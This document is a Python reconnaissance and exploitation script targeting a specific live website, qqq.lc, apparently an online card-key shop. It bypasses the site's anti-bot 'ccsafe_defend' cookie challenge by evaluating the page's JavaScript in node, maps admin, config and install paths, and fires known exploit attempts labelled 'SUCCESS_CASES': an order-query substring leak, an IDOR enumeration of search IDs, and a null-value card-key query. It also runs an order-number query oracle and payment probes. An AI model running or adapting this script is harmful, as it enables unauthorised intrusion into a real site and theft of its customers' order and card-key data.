#!/usr/bin/env python3
# qqq.lc recon — CC bypass + SUCCESS_CASES + surface map
import re, subprocess, json, time, hashlib, os, urllib.parse
from pathlib import Path

HOST = 'qqq.lc'
BASE = f'https://{HOST}'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
OUT = Path('/tmp/qqqlc_out2')
OUT.mkdir(exist_ok=True)
LOG = []

def log(*a):
    s = ' '.join(str(x) for x in a)
    print(s, flush=True)
    LOG.append(s)

class Jar:
    def __init__(self):
        self.c = {}
    def header(self):
        return '; '.join(f'{k}={v}' for k,v in self.c.items())
    def absorb(self, hdr_text):
        for line in hdr_text.splitlines():
            if line.lower().startswith('set-cookie:'):
                part = line.split(':',1)[1].strip().split(';')[0]
                if '=' in part:
                    k,v = part.split('=',1)
                    self.c[k.strip()] = v.strip()

jar = Jar()

def curl(path, method='GET', data=None, headers=None, follow=False, t=40):
    cmd = ['curl','-sk','-D','-','--max-time',str(t),'-A',UA,
           '-H',f'Referer: {BASE}/',
           '-H','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8']
    if jar.c:
        cmd += ['-H', f'Cookie: {jar.header()}']
    if headers:
        for k,v in headers.items():
            cmd += ['-H', f'{k}: {v}']
    if follow:
        cmd.append('-L')
    else:
        cmd.append('--max-redirs')
        cmd.append('0')
    url = path if path.startswith('http') else BASE + path
    if method == 'POST':
        cmd += ['-X','POST','-H','Content-Type: application/x-www-form-urlencoded']
        if data is not None:
            cmd += ['--data-binary', data]
    cmd.append(url)
    p = subprocess.run(cmd, capture_output=True, timeout=t+15)
    raw = (p.stdout or b'') + (p.stderr or b'')
    # split headers/body
    text = raw.decode('utf-8','replace')
    if '\r\n\r\n' in text:
        hdr, body = text.split('\r\n\r\n', 1)
    elif '\n\n' in text:
        hdr, body = text.split('\n\n', 1)
    else:
        hdr, body = text, ''
    # handle multiple header blocks if follow
    while 'HTTP/' in body[:20] and '\r\n\r\n' in body:
        h2, body = body.split('\r\n\r\n', 1)
        hdr = h2
    jar.absorb(hdr)
    code_m = re.search(r'HTTP/\S+\s+(\d+)', hdr)
    code = int(code_m.group(1)) if code_m else 0
    loc_m = re.search(r'(?im)^location:\s*(.+)$', hdr)
    loc = loc_m.group(1).strip() if loc_m else ''
    return code, hdr, body, loc

def pass_cc():
    # clear defend maybe keep phpsessid
    for k in list(jar.c):
        if k.startswith('ccsafe'):
            del jar.c[k]
    code, hdr, body, loc = curl('/')
    log('CC1', code, 'len', len(body), 'chenm', 'chenmYun' in body or '安全验证' in body)
    m = re.search(r"setCookie\('ccsafe_defend',(.+?)\);", body)
    if not m:
        log('NO_EXPR', body[:200])
        return False
    expr = m.group(1)
    (OUT/'expr.js').write_text('console.log('+expr+')')
    val = subprocess.check_output(['node', str(OUT/'expr.js')], timeout=20).decode().strip()
    if not re.fullmatch(r'[0-9a-f]{64}', val):
        log('BAD_VAL', val[:80])
        return False
    jar.c['ccsafe_defend'] = val
    jar.c['ccsafe_defend_time'] = '2'  # skip reload dance
    log('CC_VAL', val[:20]+'...', 'jar', jar.header()[:120])
    code, hdr, body, loc = curl('/')
    log('CC2', code, 'loc', loc, 'len', len(body), 'chenm', '安全验证' in body)
    if code in (301,302) and loc:
        # follow to login
        path = loc.replace('http://qqq.lc','').replace('https://qqq.lc','')
        if path.startswith('http'):
            code2, hdr2, body2, loc2 = curl(path, follow=False)
        else:
            code2, hdr2, body2, loc2 = curl(path)
        log('FOLLOW', code2, 'loc', loc2, 'len', len(body2), 'title', re.search(r'<title>([^<]+)', body2).group(1) if re.search(r'<title>', body2) else None)
        (OUT/'login.html').write_text(body2)
        return '安全验证' not in body2 and len(body2) > 500
    if '安全验证' not in body and len(body) > 500:
        (OUT/'home.html').write_text(body)
        return True
    # one more try with time bump
    jar.c['ccsafe_defend_time'] = '3'
    code, hdr, body, loc = curl('/index.php')
    log('CC3', code, 'loc', loc, 'len', len(body))
    if code in (301,302) and loc:
        path = loc.replace('http://qqq.lc','').replace('https://qqq.lc','')
        code2, hdr2, body2, loc2 = curl(path)
        (OUT/'login.html').write_text(body2)
        log('FOLLOW2', code2, len(body2))
        return '安全验证' not in body2
    return False

ok = pass_cc()
log('PASS_CC', ok, 'cookies', jar.header())

# ---- surface map ----
paths = [
 '/', '/index.php', '/user/login.php', '/user/reg.php', '/user/index.php',
 '/user/ajax.php', '/ajax.php', '/api.php', '/%61pi.php', '/getshop.php',
 '/?mod=index', '/?mod=buy', '/?mod=query', '/?mod=faka', '/?mod=invite',
 '/?mod=about', '/shop/', '/shop', '/faka/', '/admin/', '/admin/login.php',
 '/includes/common.php', '/config.php', '/robots.txt', '/sitemap.xml',
 '/template/', '/assets/js/main.js', '/assets/js/yt.js', '/static/js/main.js',
 '/user/findpwd.php', '/user/qrlogin.php', '/install/', '/other/getshop.php',
]

log('===== PATHS =====')
for p in paths:
    code, hdr, body, loc = curl(p)
    title = None
    tm = re.search(r'<title>([^<]+)', body)
    if tm: title = tm.group(1).strip()[:60]
    ct = 'html'
    if 'application/json' in hdr: ct='json'
    snippet = body[:80].replace('\n',' ') if body else ''
    log(f'P {code} {p} loc={loc[:60]} t={title} sn={snippet[:60]}')
    time.sleep(0.35)

# ---- ajax acts ----
log('===== AJAX =====')
xhr = {'X-Requested-With':'XMLHttpRequest'}
acts = {
 'getcount': '',
 'get': 'page=1&limit=2',
 'query': 'querytype=2&qq=1&pwd=',
 'orders': 'page=1&limit=2',
 'pay': 'tid=1&inputvalue=1',
 'login': 'user=a&pass=b',
 'reg': 'user=a&pass=b',
 'gettool': '',
 'getclass': '',
 'changelogs': '',
 'siteinfo': '',
 'card_check': 'card=',
 'captcha': '',
 'check': '',
 'connect': '',
 'invite': '',
 'gift': '',
 'cart': '',
}
for a, data in acts.items():
    code, hdr, body, loc = curl(f'/ajax.php?act={a}', method='POST', data=data, headers=xhr)
    log(f'A {code} {a}: {body[:220].replace(chr(10)," ")}')
    time.sleep(0.3)

# user ajax
for a, data in [('login','user=test&pass=test'), ('reg','user=test&pass=test'), ('checklogin',''), ('qrlogin','')]:
    code, hdr, body, loc = curl(f'/user/ajax.php?act={a}', method='POST', data=data, headers=xhr)
    log(f'UA {code} {a}: {body[:200].replace(chr(10)," ")}')
    time.sleep(0.3)

# ---- SUCCESS_CASES ----
log('===== SUCCESS_CASES =====')
# 1) qd93 substring query
for q in ['1','12','123','2026','202608','20260803','a','test','qqq']:
    code, hdr, body, loc = curl(f'/?mod=query&data={q}')
    has_faka = 'mod=faka' in body or 'kami' in body.lower() or '卡密' in body
    has_table = '<tr' in body.lower() or 'order' in body.lower()
    title = re.search(r'<title>([^<]+)', body)
    log(f'QD93 data={q} code={code} len={len(body)} faka={has_faka} title={title.group(1) if title else None} chenm={"安全验证" in body}')
    # save one
    if q=='2026':
        (OUT/'qd93_2026.html').write_text(body[:50000])
    time.sleep(0.4)

# also try POST query
code, hdr, body, loc = curl('/?mod=query', method='POST', data='data=2026&querytype=2')
log(f'QD93 POST code={code} len={len(body)} sn={body[:150].replace(chr(10)," ")}')

# 2) api search IDOR (79yj)
for basep in ['/api.php', '/%61pi.php', '/ajax.php']:
    for i in [1,2,10,100,1000,59360,59361]:
        code, hdr, body, loc = curl(f'{basep}?act=search&id={i}', method='GET', headers=xhr)
        if code != 404 and '安全验证' not in body:
            log(f'SEARCH {basep} id={i} code={code} body={body[:180].replace(chr(10)," ")}')
        elif i==1:
            log(f'SEARCH {basep} id=1 code={code} len={len(body)} sn={body[:80].replace(chr(10)," ")}')
        time.sleep(0.25)

# POST search
for basep in ['/api.php', '/%61pi.php', '/ajax.php']:
    code, hdr, body, loc = curl(f'{basep}?act=search', method='POST', data='id=1', headers=xhr)
    log(f'SEARCH_POST {basep} code={code} body={body[:180].replace(chr(10)," ")}')
    time.sleep(0.3)

# 3) YKFAKA null
for p in ['/user/order/Query_Km', '/index/order/Query_Km', '/Query_Km', '/user/api/order']:
    code, hdr, body, loc = curl(p, method='POST', data='value=null')
    log(f'YK {p} code={code} len={len(body)} sn={body[:100].replace(chr(10)," ")}')
    time.sleep(0.3)

# ---- login page analysis ----
log('===== LOGIN ANALYZE =====')
login = (OUT/'login.html').read_text(encoding='utf-8', errors='ignore') if (OUT/'login.html').exists() else ''
if not login or '安全验证' in login:
    code, hdr, body, loc = curl('/user/login.php')
    login = body
    (OUT/'login.html').write_text(login)
log('login_len', len(login))
for pat in ['csrf_token','hashsalt','SYS_KEY','gt=','geetest','captcha','mod=buy','yxts','version','template','彩虹','分站','邀请']:
    log(f'  has[{pat}]', pat in login or pat.lower() in login.lower())
# extract gt / challenge
for m in re.finditer(r'gt["\']?\s*[:=]\s*["\']([a-f0-9]{32})', login, re.I):
    log('GT', m.group(1))
for m in re.finditer(r'name="([^"]+)"[^>]*value="([^"]*)"', login):
    if m.group(1) in ('csrf_token','hash','token','gt','challenge'):
        log('INPUT', m.group(1), m.group(2)[:50])
# links
hrefs = sorted(set(re.findall(r'href=["\']([^"\']+)["\']', login)))
log('HREFS', hrefs[:40])
srcs = sorted(set(re.findall(r'src=["\']([^"\']+)["\']', login)))
log('SRCS', srcs[:30])

# ---- query oracle via ajax with TN-like ----
log('===== QUERY ORACLE =====')
tns = [
 '20260803125721600',
 '20260803000000000',
 '20260803120000001',
 '1',
 '59361',
]
for tn in tns:
    for data in [
        f'orderid={tn}',
        f'querytype=1&qq={tn}',
        f'querytype=2&qq={tn}&pwd=',
        f'querytype=0&orderid={tn}',
    ]:
        code, hdr, body, loc = curl('/ajax.php?act=query', method='POST', data=data, headers=xhr)
        log(f'Q {tn} [{data[:40]}] -> {body[:200].replace(chr(10)," ")}')
        time.sleep(0.25)

# ---- pay probes (careful) ----
log('===== PAY =====')
for tid in [1,2]:
    code, hdr, body, loc = curl('/ajax.php?act=pay', method='POST', data=f'tid={tid}&inputvalue=test1&num=1', headers=xhr)
    log(f'PAY tid={tid}', body[:220].replace('\n',' '))
    time.sleep(0.4)

# ---- getcount refresh ----
code, hdr, body, loc = curl('/ajax.php?act=getcount', method='POST', data='', headers=xhr)
log('GETCOUNT', body)
(OUT/'getcount.json').write_text(body)

# save jar
(OUT/'jar.txt').write_text(jar.header())
(OUT/'recon.log').write_text('\n'.join(LOG))
log('DONE')
